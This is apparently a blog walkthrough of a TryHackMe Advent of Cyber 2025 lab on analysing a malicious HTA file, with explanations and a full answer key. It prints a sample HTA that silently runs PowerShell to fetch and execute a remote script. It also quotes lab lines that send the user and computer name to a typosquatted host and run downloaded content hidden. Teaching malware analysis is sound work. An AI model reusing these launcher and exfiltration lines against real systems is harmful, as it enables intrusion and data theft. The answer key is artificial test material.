---
title: "TryHackMe: Advent Of Cyber 2025 Day 21 (Malware Analysis - Malhare.exe)"
categories: [TryHackMe]
tags: [dfir, Analysis, advent of cyber]
render_with_liquid: false
media_subpath: /images/tryhackme_aoc2025_day21/
image:
  path: banner.png
---

Learn about malware analysis and forensics.

<h2 style="color:#A64AC9; text-align:center; font-weight:700; font-size:1.8em; text-shadow: 1px 0 #A64AC9, -1px 0 #A64AC9, 0 1px #A64AC9, 0 -1px #A64AC9;">
  The Story
</h2>

[![TryHackMe Room Link](header.png){: width="1200" height="407" }](https://tryhackme.com/room/htapowershell-aoc2025-p2l5k8j1h4)

## Introduction

And in our kingdom of Wareville, just like in others, thousands of files of all kinds pass through the systems every day, from DOCX, PDF resumes received by our elves, to financial spreadsheets, CSVs from the accounting department, and executable files launched by different applications. But have you ever wondered which of these might be malicious? Which ones could actually belong to King Malhare? An interesting question, isn’t it?

<a href="https://github.com/nginx0/nginx0.github.io/tree/main/images/tryhackme_aoc2025_day21/survey-1761116087028.hta
" download style="
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 10px 20px;
  background: #0d6efd;        
  color: #ffffff;
  border-radius: 8px;
  font-size: 15px;
  font-family: sans-serif;
  text-decoration: none;
  font-weight: 500;
">
  <span style="font-size: 18px;">⬇</span>
  Download Task Files
</a>

## HTA Overview

Not long ago - in the summer of 2025 - researchers discovered that ransomware groups were using HTA files disguised as fake verification pages to spread the [Epsilon Red](https://www.cloudsek.com/blog/threat-actors-lure-victims-into-downloading-hta-files-using-clickfix-to-spread-epsilon-red-ransomware) ransomware. During that campaign, many organisations were affected, and security teams were reminded how important it is to understand what HTA files are, and why they appear so often in corporate environments.

So, what exactly are HTA files, and why do they exist? In Wareville's digital kingdom, not every strange-looking file is a threat. Some were originally created to make the daily work of developers and administrators easier. One such helpful invention is the HTA file, short for **HTML Application**. An HTA file is like a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript. Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - `mshta.exe` process. This allows them to look and behave like lightweight programs with their own interfaces and actions. In legitimate use cases, HTA files serve several practical purposes in Wareville and beyond:

- Automating administrative or setup tasks.
- Providing quick interfaces for internal scripts.
- Testing small prototypes without building full software.
- Offering lightweight IT support utilities for daily use.

In short, HTA files were designed as a convenient way to blend the simplicity of the web with the power of desktop applications, a tool that many TBFC’s engineers and elves still use to keep SOC-mas operations running smoothly.

## HTA File Structure

Before the defenders of TBFC can recognise suspicious HTA files, it's important to understand how a normal HTA file is built. Luckily, their structure is quite simple, in fact, it's very similar to a regular HTML page. An HTA file usually contains three main parts:

1. **The HTA declaration**: This defines the file as an HTML Application and can include basic properties like title, window size, and behaviour.
2. **The interface (HTML and CSS)**: This section creates the layout and visuals, such as buttons, forms, or text.
3. **The script (VBScript or JavaScript)**: Here is where the logic lives; it defines what actions the HTA will perform when opened or when a user interacts with it.

Here's a simple example of what a legitimate HTA file might look like:

```html
<html>
<head>
    <title>TBFC Utility Tool</title>
    <HTA:APPLICATION 
        ID="TBFCApp"
        APPLICATIONNAME="Utility Tool"
        BORDER="thin"
        CAPTION="yes"
        SHOWINTASKBAR="yes"
    />
</head>

<body>
    <h3>Welcome to the TBFC Utility Tool</h3>
    <input type="button" value="Say Hello" onclick="MsgBox('Hello from Wareville!')">
</body>
</html>
```

This small example creates a simple desktop window with a button that shows a message when clicked. In real cases, HTA scripts can be much longer and perform important tasks. It's easy to see why developers liked HTA; you could build a quick, functional tool using nothing more than web code. However, as TBFC's defenders will soon learn, the same flexibility that makes HTA convenient also makes it powerful enough to require careful attention.

## How King Malhare Turns HTAs Into Weapons

HTA files are attractive because they combine familiar web markup with script execution on Windows. In the hands of a defender, they’re a handy automation tool; in the hands of someone wanting to bypass controls, they can be used as a delivery mechanism or launcher.

**Common purposes of malicious HTA use:**

- **Initial access/delivery:** HTA files are often delivered by phishing (email attachments, fake web pages, or downloads) and run via `mshta.exe`.
- **Downloaders/droppers:** An HTA can execute a script that fetches additional binaries or scripts from the attacker’s C2.
- **Obfuscation/evasion:** HTAs can hide intent by embedding encoded data (Base64), using short VBScript/JScript fragments, or launching processes with hidden windows.
- **Living-off-the-land:** HTA commonly calls built-in Windows tools (`mshta.exe`, `powershell.exe`, `wscript.exe`, `rundll32.exe`) to avoid adding new binaries to disk.

Inside an HTA, you'll often find a small script that may be obfuscated or encoded. In practice, this tiny script usually does one of two things: downloads and runs a second-stage payload, or opens a remote control channel to let something else talk back to the attacker's server. These lightweight scripts are the reason HTAs are effective launchers, a single small file can pull in the rest of the malware.

Here is a sample that King Malhare might try to use:

```html
<html>
  <head>
    <title>Angry King Malhare</title>
    <HTA:APPLICATION ID="Malhare" APPLICATIONNAME="B" BORDER="none" 
     SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
    </HTA:APPLICATION>
    <script language="VBScript">
      Option Explicit:Dim a:Set a=CreateObject("WScript.Shell"):Dim 
      b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command "" 
      {$U=
      [System.Text.Encoding]::UTF8.GetString([System.Convert]::
      FromBase64String('aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0')) 
      $C=(Invoke-WebRequest -Uri 
      $U -UseBasicParsing).Content 
      $B=[scriptblock]::Create($C) $B}""":a.Run 
      b,0,True:self.close
    </script>
  </head>
  <body>
  </body>
</html>
```

As you can see, this HTA is very different from the simple example that we provided earlier; it contains a number of obscure elements that deserve a closer look. Let's walk through it.

When analysing HTAs, the `<title>` and `HTA:APPLICATION` tags often reveal how attackers disguise malicious apps. They might use a convincing name like ‘Salary Survey’ or ‘Internal Tool’ to appear safe, always check these first.

Secondly, there’s a VBScript block marked by `</script language="VBScript">` that’s the active part of the file where attackers often embed encoded commands or call external resources. Inside this block we find a PowerShell command `b:b="powershell -NoProfile -ExecutionPolicy Bypass -Command`, a pattern commonly seen in malicious HTAs used for delivery or launching. The PowerShell invocation contains a Base64-encoded blob - `FromBase64String`. This is likely a pointer to further instructions or a downloaded payload. If you see an encoded string, assume it hides a URL. Decoding it reveals the attacker’s command-and-control (C2) address or a resource used in the attack. Always decode before assuming what it does.

Malware authors often use multiple layers of encoding and encryption such as Base64 for obfuscation as some form of encryption or cipher to conceal the true payload. When you decode the Base64, check whether the output still looks like gibberish; if so, a second decryption step is needed.

For analysis, we'll extract that Base64 code: `aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0` and inspect it with a tool like [CyberChef](https://gchq.github.io/CyberChef/) to reveal what it hides.

![](cyberchef.png){: width="2050" height="818"}

**Note:** In the example, we've redacted the remote resource and replaced the real link with the REDACTED.txt file for safety. In a real incident, that string would usually point directly to a file hosted on the attacker's C2 domain (for example, a URL under king-malhare[.]com in our SOC-mas story).

After the encoded PowerShell command, we can see three key variables: `$U`, `$C`, and `$B`. Let’s quickly break down what each does:

- **$U**: Holds the decoded URL, the location from which the next script or payload will be fetched.
- **$C**: Stores the content downloaded from that URL, usually a PowerShell script or text instructions.
- **$B**: Converts that content into an executable scriptblock and runs it directly in memory.

Whenever you see a chain of variables like this, try to trace where each one is created, used, and passed. If a variable ends up inside a function like Run, Execute, or Eval, that’s a sign that downloaded data is being executed, a key indicator of malicious activity.

As a summary, the process for reviewing a suspicious HTA can be broken down into three main steps:

1. Identify the scripts section (VBScript)
2. Look for encoded data or external connections (e.g. Base64, HTTP requests)
3. Follow the logic to see what's execute or being sent out.

We reviewed how attackers might use an HTA file for malicious purposes. Now that you’ve seen how HTAs can combine HTML, VBScript, and PowerShell, you’ll apply the same process to analyse a suspicious one. Start by locating script sections (`<script language="VBScript">`), then identify functions, encoded strings, and any references to URLs or system calls. Decode anything that looks like it is hiding information, then trace how the script uses the results. Now it's your turn to work out what the evil king's minions did.

## From Surveys to Security Failings

Our team figured out that some of the elves' laptops were compromised. Working through the incident, it seems that the one common denominator between them all is a survey that they completed regarding their salaries. The investigation found that an email was sent to these elves with an HTA attachment. The team is asking you to review the HTA file and provide feedback on what it is actually doing. You can choose to either use the AttackBox and find the file here `/root/Rooms/AoC2025/Day21/survey.hta` or download the attached task file and perform your analysis!

Use a text editor to view the HTA to ensure that it doesn't execute, you can use pluma on the AttackBox by running the following command:

`pluma /root/Rooms/AoC2025/Day21/survey.hta`

You will see the HTA as follows:

![](survey.png){: width="726" height="785"}

We will start our analysis by searching for the metadata of the HTA, which will tell us what purpose it is telling users it has. This section is denoted by the `<head>` as shown below:

![](head.png){: width="511" height="240"}

Next we want to understand what the HTA actually does. This means we need to search for the VBScript section (`<script type="text/vbscript">`) for function definitions, meaning to look for any lines that start with `Function` or `Sub`. In our HTA, we can see 5 functions namely:

- **window_onLoad**: This function will automatically execute when the HTA loads and executes the `getQuestions()` function.
- **getQuestions()**: This function makes some external requests and then ultimately runs the `decodeBase64` function and calls the `provideFeedback` function with the data.
- **provideFeedback(feedbackString)**: This function gathers some data about the computer, makes some external requests, and then ultimately executes something we still need to analyse.
- **decodeBase64(base64)**: This function takes in a base64 string and converts it into binary.
- **RSBinaryToString(xBinary)**: This function takes binary input and converts it back into a string.

Within these functions, we want to understand any real actions being performed. These are usually denoted by `CreateObject()` with our application containing a couple, such as:

- **InternetExplorer.Application:** Allows the application to make an external connection
- **WScript.Network:** Connects to the computer's WScript Networking elements to uncover information
- **WScript.Shell:** Creates a WScript shell that can be used to execute commands on the computer

Lastly, we want to understand what the HTA actually looks like to the user. Here it is very similar to HTML files. To do this, we need to take a look at the `<body>` part of the HTA starting at line 169. This is the part that will actually be shown to the user.

Using the information and steps given above, it is time to perform an analysis of this HTA and figure out what King Malhare is up to!

## Walkthrough

**Understanding HTA Files in Malware Attacks**

An **HTA (HTML Application)** is executed by the Windows binary:

- Use HTML, CSS, and scripting languages like **VBScript**
- Are **not sandboxed** like browser-based HTML
- Can directly interact with the operating system

**Why attackers favor HTA files**
- They look harmless and familiar
- They bypass browser security controls
- They can execute commands silently
- `mshta.exe` is a trusted, pre-installed Windows binary (`LOLBin`)

In the .hta file, the `<title>` tag sets the title of the page. This title is displayed in the browser’s tab when the HTA is opened. 

![](title.png){: width="910" height="294"}

The function responsible for "downloading" the survey questions is `getQuestions()`. This function creates an Internet Explorer object (IE) and uses it to navigate to the URL that supposedly contains the survey questions.

```console
Function getQuestions()
    Dim IE, result, decoded, decodedString
    Set IE = CreateObject("InternetExplorer.Application")
    IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
    Do While IE.ReadyState < 4
    Loop
    result = IE.document.body.innerText
    IE.quit
    decoded = decodeBase64(result)
    decodedString = RSBinaryToString(decoded)
    Call provideFeedback(decodedString)
End Function
```

In this code:

- `IE.navigate2` fetches the content from the URL (`survey_questions.txt`).
- `IE.document.body.innerText` grabs the content from that page (the survey questions in this case).

The code specifies that the survey questions are being downloaded from:

```console
IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
```

> Notice the typo in "festiival" (should be "festival"). This is an example of typosquatting.
{: .prompt-tip }

The domain `survey.bestfestiivalcompany.com` uses an extra "`i`" in "`festiival`" instead of the usual spelling "`festival`." This is a deliberate misspelling to trick users into thinking it's the official site.

There are 4 survey questions in the HTML code. Each question is wrapped in an `<h3>` tag, and the corresponding radio buttons follow each question. Here are the 4 questions from the HTML:

```html
<h3>How long have you been employed at Best Festival Company?</h3>
<h3>Do you feel valued at work?</h3>
<h3>Do you feel content with your current salary?</h3>
<h3>By how much do you believe your salary should increase?</h3>
```

At the end of the survey, there’s a message encouraging users to complete the survey for a chance to win a trip:

```html
<div>Thank you for your feedback!</div>
<div>All participants will be entered into a prize draw for a chance to win a trip to the South Pole!</div>
```

This is a classic social engineering tactic to make users trust the survey.

The code gathers user name and computer name by using the `WScript.Network` object:

```console
strHost = CreateObject("WScript.Network").ComputerName
strUser = CreateObject("WScript.Network").UserName
```

- `strHost` stores the computer name.
- `strUser` stores the user name of the person running the HTA.

The collected `strUser` and `strHost` data is being sent to the following endpoint on the remote server:

```console
IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
```

So, the endpoint being used to exfiltrate the data is `/details`.

The method used to send the data is **GET** because the data (`strUser` and `strHost`) is appended as query parameters in the URL:

```console
IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
```

This is typical of a **GET** request, where data is sent in the URL rather than in the request body.

Once the survey questions are downloaded and decoded, they are executed through PowerShell. The decoded contents are passed to the feedbackString variable, which is then executed by PowerShell:

```console
runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
```

- `-nop`: No profile is executed.
- `-w hidden`: The PowerShell window runs in the background (hidden).
- The command runs whatever script is in `feedbackString`.

The data from the survey questions is encoded in Base64. The script uses `decodeBase64` to decode the Base64-encoded content:

```console
decoded = decodeBase64(result)
```

The content of **blob.txt** `ZnVuY3Rpb24gQUFCQiB7...` begins with Zn, which is a common signature for Base64 encoded data. Base64 is used here to obfuscate or hide the original content in the script.

```console
function AABB {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Text
    )

    $sb = New-Object System.Text.StringBuilder $Text.Length
    foreach ($ch in $Text.ToCharArray()) {
        $c = [int][char]$ch

        if ($c -ge 65 -and $c -le 90) {           
            $c = (($c - 65 + 13) % 26) + 65
        }
        elseif ($c -ge 97 -and $c -le 122) {      
            $c = (($c - 97 + 13) % 26) + 97
        }

        [void]$sb.Append([char]$c)
    }
    $sb.ToString()
}

$flag = 'GUZ{Znyjner.Nanylfrq}'

$deco = AABB -Text $flag
Write-Output $deco
```
- The script defines a function `AABQ` that implements **ROT13**, a simple cipher that shifts letters in the alphabet by 13 positions.
- The function is used to decode the text `GUZ{Znyjner.Nanylfrq}`, which is ROT13-encoded. From here we can use [CyberChef](https://gchq.github.io/CyberChef) to decode the flag.

## Answer

### Question 1

What is the title of the HTA application?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('Best Festival Company Developer Survey')" style="cursor:pointer;">Best Festival Company Developer Survey</span>
    <i onclick="navigator.clipboard.writeText('Best Festival Company Developer Survey')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 2

What VBScript function is acting as if it is downloading the survey questions?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('getQuestions')" style="cursor:pointer;">getQuestions</span>
    <i onclick="navigator.clipboard.writeText('getQuestions')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 3

What URL domain (including sub-domain) is the "questions" being downloaded from?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('survey.bestfestiivalcompany.com')" style="cursor:pointer;">survey.bestfestiivalcompany.com</span>
    <i onclick="navigator.clipboard.writeText('survey.bestfestiivalcompany.com')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 4

Malhare seems to be using typosquatting, domains that look the same as the real one, in an attempt to hide the fact that the domain is not the inteded one, what character in the domain gives this away?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('i')" style="cursor:pointer;">i</span>
    <i onclick="navigator.clipboard.writeText('i')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 5

Malicious HTAs often include real-looking data, like survey questions, to make the file seem authentic. How many questions does the survey have?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('4')" style="cursor:pointer;">4</span>
    <i onclick="navigator.clipboard.writeText('4')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 6

Notice how even in code, social engineering persists, fake incentives like contests or trips hide in plain sight to build trust. The survey entices participation by promising a chance to win a trip to where?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('South Pole')" style="cursor:pointer;">South Pole</span>
    <i onclick="navigator.clipboard.writeText('South Pole')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 7

The HTA is enumerating information from the local host executing the application. What two pieces of information about the computer it is running on are being exfiltrated? You should provide the two object names separated by commas.

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('ComputerName,UserName')" style="cursor:pointer;">ComputerName,UserName</span>
    <i onclick="navigator.clipboard.writeText('ComputerName,UserName')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 8

What endpoint is the enumerated data being exfiltrated to?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('/details')" style="cursor:pointer;">/details</span>
    <i onclick="navigator.clipboard.writeText('/details')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 9

What HTTP method is being used to exfiltrate the data?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('GET')" style="cursor:pointer;">GET</span>
    <i onclick="navigator.clipboard.writeText('GET')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 10

After reviewing the function intended to get the survey questions, it seems that the data from the download of the questions is actually being executed. What is the line of code that executes the contents of the download?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('runObject.Run &quot;powershell.exe -nop -w hidden -c &quot; &amp; feedbackString, 0, False')"
          style="cursor:pointer;">runObject.Run &quot;powershell.exe -nop -w hidden -c &quot; &amp; feedbackString, 0, False</span>
    <i onclick="navigator.clipboard.writeText('runObject.Run &quot;powershell.exe -nop -w hidden -c &quot; &amp; feedbackString, 0, False')"
       style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 11

It seems as if the malware site has been taken down, so we cannot download the contents that the malware was executing. Fortunately, one of the elves created a copy when the site was still active. Download the contents from [here](https://github.com/nginx0/nginx0.github.io/tree/main/images/tryhackme_aoc2025_day21/blob.txt). What popular encoding scheme was used in an attempt to obfuscate the download?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('base64')" style="cursor:pointer;">base64</span>
    <i onclick="navigator.clipboard.writeText('base64')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 12

Decode the payload. It seems as if additional steps where taken to hide the malware! What common encryption scheme was used in the script?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('rot13')" style="cursor:pointer;">rot13</span>
    <i onclick="navigator.clipboard.writeText('rot13')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>

### Question 13

Either run the script or decrypt the flag value using online tools such as CyberChef. What is the flag value?

<details>
  <summary style="cursor:pointer; padding:10px; border:1px solid #888; background-color:#444; color:#fff; user-select: none;">
    Answer
  </summary>
  <div style="padding:10px; border:1px solid #888; background-color:#333; color:#fff;">
    <span onclick="navigator.clipboard.writeText('THM{Malware.Analysed}')" style="cursor:pointer;">THM{Malware.Analysed}</span>
    <i onclick="navigator.clipboard.writeText('THM{Malware.Analysed}')" style="float:right; cursor:pointer; font-size:16px;">&#x1F4C4;</i>
  </div>
</details>